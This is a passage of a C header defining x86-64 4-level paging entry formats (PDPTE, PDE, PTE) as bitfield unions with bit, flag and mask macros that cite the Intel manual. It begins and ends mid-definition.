         * [Bit 5] Accessed; indicates whether software has accessed the 1-GByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PDPTE_1GB_64_ACCESSED_BIT                                    5
#define PDPTE_1GB_64_ACCESSED_FLAG                                   0x20
#define PDPTE_1GB_64_ACCESSED_MASK                                   0x01
#define PDPTE_1GB_64_ACCESSED(_)                                     (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Dirty; indicates whether software has written to the 1-GByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Dirty : 1;
#define PDPTE_1GB_64_DIRTY_BIT                                       6
#define PDPTE_1GB_64_DIRTY_FLAG                                      0x40
#define PDPTE_1GB_64_DIRTY_MASK                                      0x01
#define PDPTE_1GB_64_DIRTY(_)                                        (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Page size; must be 1 (otherwise, this entry references a page directory).
         */
        UINT64 LargePage : 1;
#define PDPTE_1GB_64_LARGE_PAGE_BIT                                  7
#define PDPTE_1GB_64_LARGE_PAGE_FLAG                                 0x80
#define PDPTE_1GB_64_LARGE_PAGE_MASK                                 0x01
#define PDPTE_1GB_64_LARGE_PAGE(_)                                   (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored otherwise.
         *
         * @see Vol3A[4.10(Caching Translation Information)]
         */
        UINT64 Global : 1;
#define PDPTE_1GB_64_GLOBAL_BIT                                      8
#define PDPTE_1GB_64_GLOBAL_FLAG                                     0x100
#define PDPTE_1GB_64_GLOBAL_MASK                                     0x01
#define PDPTE_1GB_64_GLOBAL(_)                                       (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT64 Ignored1 : 3;
#define PDPTE_1GB_64_IGNORED_1_BIT                                   9
#define PDPTE_1GB_64_IGNORED_1_FLAG                                  0xE00
#define PDPTE_1GB_64_IGNORED_1_MASK                                  0x07
#define PDPTE_1GB_64_IGNORED_1(_)                                    (((_) >> 9) & 0x07)

        /**
         * [Bit 12] Indirectly determines the memory type used to access the 1-GByte page referenced by this entry.
         *
         * @note The PAT is supported on all processors that support 4-level paging.
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 Pat : 1;
#define PDPTE_1GB_64_PAT_BIT                                         12
#define PDPTE_1GB_64_PAT_FLAG                                        0x1000
#define PDPTE_1GB_64_PAT_MASK                                        0x01
#define PDPTE_1GB_64_PAT(_)                                          (((_) >> 12) & 0x01)
        UINT64 Reserved1 : 17;

        /**
         * [Bits 47:30] Physical address of the 1-GByte page referenced by this entry.
         */
        UINT64 PageFrameNumber : 18;
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_BIT                           30
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_FLAG                          0xFFFFC0000000
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_MASK                          0x3FFFF
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER(_)                            (((_) >> 30) & 0x3FFFF)
        UINT64 Reserved2 : 4;

        /**
         * [Bits 58:52] Ignored.
         */
        UINT64 Ignored2 : 7;
#define PDPTE_1GB_64_IGNORED_2_BIT                                   52
#define PDPTE_1GB_64_IGNORED_2_FLAG                                  0x7F0000000000000
#define PDPTE_1GB_64_IGNORED_2_MASK                                  0x7F
#define PDPTE_1GB_64_IGNORED_2(_)                                    (((_) >> 52) & 0x7F)

        /**
         * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page; ignored otherwise.
         *
         * @see Vol3A[4.6.2(Protection Keys)]
         */
        UINT64 ProtectionKey : 4;
#define PDPTE_1GB_64_PROTECTION_KEY_BIT                              59
#define PDPTE_1GB_64_PROTECTION_KEY_FLAG                             0x7800000000000000
#define PDPTE_1GB_64_PROTECTION_KEY_MASK                             0x0F
#define PDPTE_1GB_64_PROTECTION_KEY(_)                               (((_) >> 59) & 0x0F)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 1-GByte page
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PDPTE_1GB_64_EXECUTE_DISABLE_BIT                             63
#define PDPTE_1GB_64_EXECUTE_DISABLE_FLAG                            0x8000000000000000
#define PDPTE_1GB_64_EXECUTE_DISABLE_MASK                            0x01
#define PDPTE_1GB_64_EXECUTE_DISABLE(_)                              (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PDPTE_1GB_64;

/**
 * @brief Format of a 4-Level Page-Directory-Pointer-Table Entry (PDPTE) that References a Page Directory
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to reference a page directory.
         */
        UINT64 Present : 1;
#define PDPTE_64_PRESENT_BIT                                         0
#define PDPTE_64_PRESENT_FLAG                                        0x01
#define PDPTE_64_PRESENT_MASK                                        0x01
#define PDPTE_64_PRESENT(_)                                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 1-GByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PDPTE_64_WRITE_BIT                                           1
#define PDPTE_64_WRITE_FLAG                                          0x02
#define PDPTE_64_WRITE_MASK                                          0x01
#define PDPTE_64_WRITE(_)                                            (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 1-GByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PDPTE_64_SUPERVISOR_BIT                                      2
#define PDPTE_64_SUPERVISOR_FLAG                                     0x04
#define PDPTE_64_SUPERVISOR_MASK                                     0x01
#define PDPTE_64_SUPERVISOR(_)                                       (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the page directory referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_BIT                        3
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                       0x08
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_MASK                       0x01
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH(_)                         (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the page directory referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_BIT                        4
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                       0x10
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_MASK                       0x01
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE(_)                         (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PDPTE_64_ACCESSED_BIT                                        5
#define PDPTE_64_ACCESSED_FLAG                                       0x20
#define PDPTE_64_ACCESSED_MASK                                       0x01
#define PDPTE_64_ACCESSED(_)                                         (((_) >> 5) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 7] Page size; must be 0 (otherwise, this entry maps a 1-GByte page).
         */
        UINT64 LargePage : 1;
#define PDPTE_64_LARGE_PAGE_BIT                                      7
#define PDPTE_64_LARGE_PAGE_FLAG                                     0x80
#define PDPTE_64_LARGE_PAGE_MASK                                     0x01
#define PDPTE_64_LARGE_PAGE(_)                                       (((_) >> 7) & 0x01)

        /**
         * [Bits 11:8] Ignored.
         */
        UINT64 Ignored1 : 4;
#define PDPTE_64_IGNORED_1_BIT                                       8
#define PDPTE_64_IGNORED_1_FLAG                                      0xF00
#define PDPTE_64_IGNORED_1_MASK                                      0x0F
#define PDPTE_64_IGNORED_1(_)                                        (((_) >> 8) & 0x0F)

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned page directory referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define PDPTE_64_PAGE_FRAME_NUMBER_BIT                               12
#define PDPTE_64_PAGE_FRAME_NUMBER_FLAG                              0xFFFFFFFFF000
#define PDPTE_64_PAGE_FRAME_NUMBER_MASK                              0xFFFFFFFFF
#define PDPTE_64_PAGE_FRAME_NUMBER(_)                                (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 4;

        /**
         * [Bits 62:52] Ignored.
         */
        UINT64 Ignored2 : 11;
#define PDPTE_64_IGNORED_2_BIT                                       52
#define PDPTE_64_IGNORED_2_FLAG                                      0x7FF0000000000000
#define PDPTE_64_IGNORED_2_MASK                                      0x7FF
#define PDPTE_64_IGNORED_2(_)                                        (((_) >> 52) & 0x7FF)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 1-GByte region
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PDPTE_64_EXECUTE_DISABLE_BIT                                 63
#define PDPTE_64_EXECUTE_DISABLE_FLAG                                0x8000000000000000
#define PDPTE_64_EXECUTE_DISABLE_MASK                                0x01
#define PDPTE_64_EXECUTE_DISABLE(_)                                  (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PDPTE_64;

/**
 * @brief Format of a 4-Level Page-Directory Entry that Maps a 2-MByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to map a 2-MByte page.
         */
        UINT64 Present : 1;
#define PDE_2MB_64_PRESENT_BIT                                       0
#define PDE_2MB_64_PRESENT_FLAG                                      0x01
#define PDE_2MB_64_PRESENT_MASK                                      0x01
#define PDE_2MB_64_PRESENT(_)                                        (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 2-MByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PDE_2MB_64_WRITE_BIT                                         1
#define PDE_2MB_64_WRITE_FLAG                                        0x02
#define PDE_2MB_64_WRITE_MASK                                        0x01
#define PDE_2MB_64_WRITE(_)                                          (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 2-MByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PDE_2MB_64_SUPERVISOR_BIT                                    2
#define PDE_2MB_64_SUPERVISOR_FLAG                                   0x04
#define PDE_2MB_64_SUPERVISOR_MASK                                   0x01
#define PDE_2MB_64_SUPERVISOR(_)                                     (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the 2-MByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_BIT                      3
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                     0x08
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_MASK                     0x01
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH(_)                       (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the 2-MByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_BIT                      4
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                     0x10
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_MASK                     0x01
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE(_)                       (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether software has accessed the 2-MByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PDE_2MB_64_ACCESSED_BIT                                      5
#define PDE_2MB_64_ACCESSED_FLAG                                     0x20
#define PDE_2MB_64_ACCESSED_MASK                                     0x01
#define PDE_2MB_64_ACCESSED(_)                                       (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Dirty; indicates whether software has written to the 2-MByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Dirty : 1;
#define PDE_2MB_64_DIRTY_BIT                                         6
#define PDE_2MB_64_DIRTY_FLAG                                        0x40
#define PDE_2MB_64_DIRTY_MASK                                        0x01
#define PDE_2MB_64_DIRTY(_)                                          (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Page size; must be 1 (otherwise, this entry references a page directory).
         */
        UINT64 LargePage : 1;
#define PDE_2MB_64_LARGE_PAGE_BIT                                    7
#define PDE_2MB_64_LARGE_PAGE_FLAG                                   0x80
#define PDE_2MB_64_LARGE_PAGE_MASK                                   0x01
#define PDE_2MB_64_LARGE_PAGE(_)                                     (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored otherwise.
         *
         * @see Vol3A[4.10(Caching Translation Information)]
         */
        UINT64 Global : 1;
#define PDE_2MB_64_GLOBAL_BIT                                        8
#define PDE_2MB_64_GLOBAL_FLAG                                       0x100
#define PDE_2MB_64_GLOBAL_MASK                                       0x01
#define PDE_2MB_64_GLOBAL(_)                                         (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT64 Ignored1 : 3;
#define PDE_2MB_64_IGNORED_1_BIT                                     9
#define PDE_2MB_64_IGNORED_1_FLAG                                    0xE00
#define PDE_2MB_64_IGNORED_1_MASK                                    0x07
#define PDE_2MB_64_IGNORED_1(_)                                      (((_) >> 9) & 0x07)

        /**
         * [Bit 12] Indirectly determines the memory type used to access the 2-MByte page referenced by this entry.
         *
         * @note The PAT is supported on all processors that support 4-level paging.
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 Pat : 1;
#define PDE_2MB_64_PAT_BIT                                           12
#define PDE_2MB_64_PAT_FLAG                                          0x1000
#define PDE_2MB_64_PAT_MASK                                          0x01
#define PDE_2MB_64_PAT(_)                                            (((_) >> 12) & 0x01)
        UINT64 Reserved1 : 8;

        /**
         * [Bits 47:21] Physical address of the 2-MByte page referenced by this entry.
         */
        UINT64 PageFrameNumber : 27;
#define PDE_2MB_64_PAGE_FRAME_NUMBER_BIT                             21
#define PDE_2MB_64_PAGE_FRAME_NUMBER_FLAG                            0xFFFFFFE00000
#define PDE_2MB_64_PAGE_FRAME_NUMBER_MASK                            0x7FFFFFF
#define PDE_2MB_64_PAGE_FRAME_NUMBER(_)                              (((_) >> 21) & 0x7FFFFFF)
        UINT64 Reserved2 : 4;

        /**
         * [Bits 58:52] Ignored.
         */
        UINT64 Ignored2 : 7;
#define PDE_2MB_64_IGNORED_2_BIT                                     52
#define PDE_2MB_64_IGNORED_2_FLAG                                    0x7F0000000000000
#define PDE_2MB_64_IGNORED_2_MASK                                    0x7F
#define PDE_2MB_64_IGNORED_2(_)                                      (((_) >> 52) & 0x7F)

        /**
         * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page; ignored otherwise.
         *
         * @see Vol3A[4.6.2(Protection Keys)]
         */
        UINT64 ProtectionKey : 4;
#define PDE_2MB_64_PROTECTION_KEY_BIT                                59
#define PDE_2MB_64_PROTECTION_KEY_FLAG                               0x7800000000000000
#define PDE_2MB_64_PROTECTION_KEY_MASK                               0x0F
#define PDE_2MB_64_PROTECTION_KEY(_)                                 (((_) >> 59) & 0x0F)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 2-MByte page
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PDE_2MB_64_EXECUTE_DISABLE_BIT                               63
#define PDE_2MB_64_EXECUTE_DISABLE_FLAG                              0x8000000000000000
#define PDE_2MB_64_EXECUTE_DISABLE_MASK                              0x01
#define PDE_2MB_64_EXECUTE_DISABLE(_)                                (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PDE_2MB_64;

/**
 * @brief Format of a 4-Level Page-Directory Entry that References a Page Table
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to reference a page table.
         */
        UINT64 Present : 1;
#define PDE_64_PRESENT_BIT                                           0
#define PDE_64_PRESENT_FLAG                                          0x01
#define PDE_64_PRESENT_MASK                                          0x01
#define PDE_64_PRESENT(_)                                            (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 2-MByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PDE_64_WRITE_BIT                                             1
#define PDE_64_WRITE_FLAG                                            0x02
#define PDE_64_WRITE_MASK                                            0x01
#define PDE_64_WRITE(_)                                              (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 2-MByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PDE_64_SUPERVISOR_BIT                                        2
#define PDE_64_SUPERVISOR_FLAG                                       0x04
#define PDE_64_SUPERVISOR_MASK                                       0x01
#define PDE_64_SUPERVISOR(_)                                         (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the page table referenced by this
         * entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_BIT                          3
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                         0x08
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_MASK                         0x01
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH(_)                           (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this
         * entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_BIT                          4
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                         0x10
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_MASK                         0x01
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE(_)                           (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PDE_64_ACCESSED_BIT                                          5
#define PDE_64_ACCESSED_FLAG                                         0x20
#define PDE_64_ACCESSED_MASK                                         0x01
#define PDE_64_ACCESSED(_)                                           (((_) >> 5) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 7] Page size; must be 0 (otherwise, this entry maps a 2-MByte page).
         */
        UINT64 LargePage : 1;
#define PDE_64_LARGE_PAGE_BIT                                        7
#define PDE_64_LARGE_PAGE_FLAG                                       0x80
#define PDE_64_LARGE_PAGE_MASK                                       0x01
#define PDE_64_LARGE_PAGE(_)                                         (((_) >> 7) & 0x01)

        /**
         * [Bits 11:8] Ignored.
         */
        UINT64 Ignored1 : 4;
#define PDE_64_IGNORED_1_BIT                                         8
#define PDE_64_IGNORED_1_FLAG                                        0xF00
#define PDE_64_IGNORED_1_MASK                                        0x0F
#define PDE_64_IGNORED_1(_)                                          (((_) >> 8) & 0x0F)

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned page table referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define PDE_64_PAGE_FRAME_NUMBER_BIT                                 12
#define PDE_64_PAGE_FRAME_NUMBER_FLAG                                0xFFFFFFFFF000
#define PDE_64_PAGE_FRAME_NUMBER_MASK                                0xFFFFFFFFF
#define PDE_64_PAGE_FRAME_NUMBER(_)                                  (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 4;

        /**
         * [Bits 62:52] Ignored.
         */
        UINT64 Ignored2 : 11;
#define PDE_64_IGNORED_2_BIT                                         52
#define PDE_64_IGNORED_2_FLAG                                        0x7FF0000000000000
#define PDE_64_IGNORED_2_MASK                                        0x7FF
#define PDE_64_IGNORED_2(_)                                          (((_) >> 52) & 0x7FF)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 2-MByte region
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PDE_64_EXECUTE_DISABLE_BIT                                   63
#define PDE_64_EXECUTE_DISABLE_FLAG                                  0x8000000000000000
#define PDE_64_EXECUTE_DISABLE_MASK                                  0x01
#define PDE_64_EXECUTE_DISABLE(_)                                    (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PDE_64;

/**
 * @brief Format of a 4-Level Page-Table Entry that Maps a 4-KByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to map a 4-KByte page.
         */
        UINT64 Present : 1;
#define PTE_64_PRESENT_BIT                                           0
#define PTE_64_PRESENT_FLAG                                          0x01
#define PTE_64_PRESENT_MASK                                          0x01
#define PTE_64_PRESENT(_)                                            (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PTE_64_WRITE_BIT                                             1
#define PTE_64_WRITE_FLAG                                            0x02
#define PTE_64_WRITE_MASK                                            0x01
#define PTE_64_WRITE(_)                                              (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PTE_64_SUPERVISOR_BIT                                        2
#define PTE_64_SUPERVISOR_FLAG                                       0x04
#define PTE_64_SUPERVISOR_MASK                                       0x01
#define PTE_64_SUPERVISOR(_)                                         (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the 4-KByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_BIT                          3
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                         0x08
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH_MASK                         0x01
#define PTE_64_PAGE_LEVEL_WRITE_THROUGH(_)                           (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the 4-KByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_BIT                          4
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                         0x10
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE_MASK                         0x01
#define PTE_64_PAGE_LEVEL_CACHE_DISABLE(_)                           (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether software has accessed the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PTE_64_ACCESSED_BIT                                          5
#define PTE_64_ACCESSED_FLAG                                         0x20
#define PTE_64_ACCESSED_MASK                                         0x01
#define PTE_64_ACCESSED(_)                                           (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Dirty; indicates whether software has written to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Dirty : 1;
#define PTE_64_DIRTY_BIT                                             6
#define PTE_64_DIRTY_FLAG                                            0x40
#define PTE_64_DIRTY_MASK                                            0x01
#define PTE_64_DIRTY(_)                                              (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Indirectly determines the memory type used to access the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 Pat : 1;
#define PTE_64_PAT_BIT                                               7
#define PTE_64_PAT_FLAG                                              0x80
#define PTE_64_PAT_MASK                                              0x01
#define PTE_64_PAT(_)                                                (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored otherwise.
         *
         * @see Vol3A[4.10(Caching Translation Information)]
         */
        UINT64 Global : 1;
#define PTE_64_GLOBAL_BIT                                            8
#define PTE_64_GLOBAL_FLAG                                           0x100
#define PTE_64_GLOBAL_MASK                                           0x01
#define PTE_64_GLOBAL(_)                                             (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT64 CopyOnWrite : 1;
        UINT64 Unused : 1;
        UINT64 Write1 : 1;
#define PTE_64_IGNORED_1_BIT                                         9
#define PTE_64_IGNORED_1_FLAG                                        0xE00
#define PTE_64_IGNORED_1_MASK                                        0x07
#define PTE_64_IGNORED_1(_)                                          (((_) >> 9) & 0x07)

        /**
         * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define PTE_64_PAGE_FRAME_NUMBER_BIT                                 12
#define PTE_64_PAGE_FRAME_NUMBER_FLAG                                0xFFFFFFFFF000
#define PTE_64_PAGE_FRAME_NUMBER_MASK                                0xFFFFFFFFF
#define PTE_64_PAGE_FRAME_NUMBER(_)                                  (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 58:52] Ignored.
         */
        UINT64 Ignored2 : 7;
#define PTE_64_IGNORED_2_BIT                                         52
#define PTE_64_IGNORED_2_FLAG                                        0x7F0000000000000
#define PTE_64_IGNORED_2_MASK                                        0x7F
#define PTE_64_IGNORED_2(_)                                          (((_) >> 52) & 0x7F)

        /**
         * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page; ignored otherwise.
         *
         * @see Vol3A[4.6.2(Protection Keys)]
         */
        UINT64 ProtectionKey : 4;
#define PTE_64_PROTECTION_KEY_BIT                                    59
#define PTE_64_PROTECTION_KEY_FLAG                                   0x7800000000000000
#define PTE_64_PROTECTION_KEY_MASK                                   0x0F
#define PTE_64_PROTECTION_KEY(_)                                     (((_) >> 59) & 0x0F)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 1-GByte page
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PTE_64_EXECUTE_DISABLE_BIT                                   63
#define PTE_64_EXECUTE_DISABLE_FLAG                                  0x8000000000000000
#define PTE_64_EXECUTE_DISABLE_MASK                                  0x01
#define PTE_64_EXECUTE_DISABLE(_)                                    (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PTE_64;

/**
 * @brief Format of a common Page-Table Entry
 */
typedef union
{
    struct
    {
        UINT64 Present : 1;
#define PT_ENTRY_64_PRESENT_BIT                                      0
#define PT_ENTRY_64_PRESENT_FLAG                                     0x01
#define PT_ENTRY_64_PRESENT_MASK                                     0x01
#define PT_ENTRY_64_PRESENT(_)                                       (((_) >> 0) & 0x01)
        UINT64 Write : 1;
#define PT_ENTRY_64_WRITE_BIT                                        1
#define PT_ENTRY_64_WRITE_FLAG                                       0x02
#define PT_ENTRY_64_WRITE_MASK                                       0x01
#define PT_ENTRY_64_WRITE(_)                                         (((_) >> 1) & 0x01)
        UINT64 Supervisor : 1;
#define PT_ENTRY_64_SUPERVISOR_BIT                                   2
#define PT_ENTRY_64_SUPERVISOR_FLAG                                  0x04
#define PT_ENTRY_64_SUPERVISOR_MASK                                  0x01
#define PT_ENTRY_64_SUPERVISOR(_)                                    (((_) >> 2) & 0x01)
        UINT64 PageLevelWriteThrough : 1;
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_BIT                     3
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                    0x08
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH_MASK                    0x01
#define PT_ENTRY_64_PAGE_LEVEL_WRITE_THROUGH(_)                      (((_) >> 3) & 0x01)
        UINT64 PageLevelCacheDisable : 1;
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_BIT                     4
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                    0x10
#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE_MASK                    0x01
